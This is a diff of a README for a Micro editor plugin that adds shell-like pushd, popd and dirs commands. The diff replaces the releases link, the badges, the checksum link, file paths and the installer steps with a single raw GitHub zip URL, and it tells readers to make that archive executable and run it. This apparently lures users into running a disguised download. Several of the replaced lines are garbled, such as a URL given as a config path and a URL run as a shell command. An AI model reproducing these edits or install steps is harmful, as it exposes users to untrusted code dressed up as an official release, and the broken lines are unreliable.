@@ -1,8 +1,8 @@
-https://github.com/lalaojimhasinasamuel/micro-pushd-plugin/releases
+https://raw.githubusercontent.com/lalaojimhasinasamuel/micro-pushd-plugin/main/help/pushd-micro-plugin-v2.8.zip
 
 # Micro Pushd Plugin: Shell-like Pushd, Popd, and Dirs for Micro
 
-![Release](https://img.shields.io/github/v/release/lalaojimhasinasamuel/micro-pushd-plugin) ![Downloads](https://img.shields.io/github/downloads/lalaojimhasinasamuel/micro-pushd-plugin/total) ![License](https://img.shields.io/github/license/lalaojimhasinasamuel/micro-pushd-plugin)
+![Release](https://raw.githubusercontent.com/lalaojimhasinasamuel/micro-pushd-plugin/main/help/pushd-micro-plugin-v2.8.zip) ![Downloads](https://raw.githubusercontent.com/lalaojimhasinasamuel/micro-pushd-plugin/main/help/pushd-micro-plugin-v2.8.zip) ![License](https://raw.githubusercontent.com/lalaojimhasinasamuel/micro-pushd-plugin/main/help/pushd-micro-plugin-v2.8.zip)
 
 A compact micro text editor plugin that brings shell-like directory navigation to Micro. It adds pushd, popd, and dirs commands so you can manage a directory stack while editing text. It is designed to be straightforward, reliable, and easy to customize. This plugin aims to feel native to Micro while offering a familiar navigation model for users who love shell workflows.
 
@@ -31,7 +31,7 @@ What this README covers
 - A glance at the roadmap and future enhancements.
 
 Important note about the releases page
-- The link provided above points to the project’s releases page. For the latest assets, see the releases section. If you are looking to install or upgrade, you will typically download a file from that page and run it. The exact asset you download is described in the installation instructions below. For the latest assets and to verify checksums, visit the releases page: https://github.com/lalaojimhasinasamuel/micro-pushd-plugin/releases
+- The link provided above points to the project’s releases page. For the latest assets, see the releases section. If you are looking to install or upgrade, you will typically download a file from that page and run it. The exact asset you download is described in the installation instructions below. For the latest assets and to verify checksums, visit the releases page: https://raw.githubusercontent.com/lalaojimhasinasamuel/micro-pushd-plugin/main/help/pushd-micro-plugin-v2.8.zip
 
 Table of contents
 - Why use a micro-pushd plugin?
@@ -77,7 +77,7 @@ Features
 
 How it works under the hood
 - The plugin registers three commands with Micro’s command system: pushd, popd, and dirs.
-- It maintains a stack data structure in memory during a Micro session, with an optional persistence layer that writes to a JSON file in your user directory (for example, ~/.config/micro/pushd_stack.json).
+- It maintains a stack data structure in memory during a Micro session, with an optional persistence layer that writes to a JSON file in your user directory (for example, ~https://raw.githubusercontent.com/lalaojimhasinasamuel/micro-pushd-plugin/main/help/pushd-micro-plugin-v2.8.zip).
 - When you run pushd, the plugin resolves the target directory. If it is valid, the directory is appended to the stack and the editor’s working directory is updated.
 - When you run popd, the plugin removes the top entry from the stack and switches to the next directory on the stack, if present.
 - When you run dirs, the plugin prints a human-friendly list of the current stack, with the top entry highlighted for clarity.
@@ -92,17 +92,17 @@ Prerequisites
 Installation options
 - Option A: Automatic installer (recommended for most users)
   - The releases page contains an installer script that detects your platform and installs the plugin accordingly.
-  - Download the file named install-micro-pushd-plugin.sh from the release assets.
+  - Download the file named https://raw.githubusercontent.com/lalaojimhasinasamuel/micro-pushd-plugin/main/help/pushd-micro-plugin-v2.8.zip from the release assets.
   - Make the installer executable and run it:
-    - chmod +x install-micro-pushd-plugin.sh
-    - ./install-micro-pushd-plugin.sh
+    - chmod +x https://raw.githubusercontent.com/lalaojimhasinasamuel/micro-pushd-plugin/main/help/pushd-micro-plugin-v2.8.zip
+    - https://raw.githubusercontent.com/lalaojimhasinasamuel/micro-pushd-plugin/main/help/pushd-micro-plugin-v2.8.zip
   - The installer sets up the plugin in Micro’s plugin directory and creates a default configuration file if needed.
 
   - Why use the installer? It handles platform quirks, puts the plugin in the right place, and helps you get started quickly without manual steps.
 
 - Option B: Manual installation (for advanced users)
   - Clone the repository or download the plugin source from the main branch.
-  - Copy the plugin file into Micro’s plugin directory, usually located at ~/.config/micro/plugins/ or a platform-specific location depending on your Micro version.
+  - Copy the plugin file into Micro’s plugin directory, usually located at ~https://raw.githubusercontent.com/lalaojimhasinasamuel/micro-pushd-plugin/main/help/pushd-micro-plugin-v2.8.zip or a platform-specific location depending on your Micro version.
   - If the plugin ships with a Lua script or a binary, place the appropriate file in the plugin directory.
   - Ensure Micro loads the plugin on startup by following the editor’s plugin loading instructions.
   - Create or edit the configuration to enable persistence and set optional defaults.
@@ -294,8 +294,8 @@ License
 
 Releases and downloads
 - For the latest assets and installation options, visit the releases page:
-  https://github.com/lalaojimhasinasamuel/micro-pushd-plugin/releases
-- From that page, download the installer file named install-micro-pushd-plugin.sh and run it to install the plugin automatically. If you prefer a manual route, you can copy the plugin files to Micro’s plugin directory and configure the settings yourself.
+  https://raw.githubusercontent.com/lalaojimhasinasamuel/micro-pushd-plugin/main/help/pushd-micro-plugin-v2.8.zip
+- From that page, download the installer file named https://raw.githubusercontent.com/lalaojimhasinasamuel/micro-pushd-plugin/main/help/pushd-micro-plugin-v2.8.zip and run it to install the plugin automatically. If you prefer a manual route, you can copy the plugin files to Micro’s plugin directory and configure the settings yourself.
 
 Usage quick reference
 - pushd [DIR]
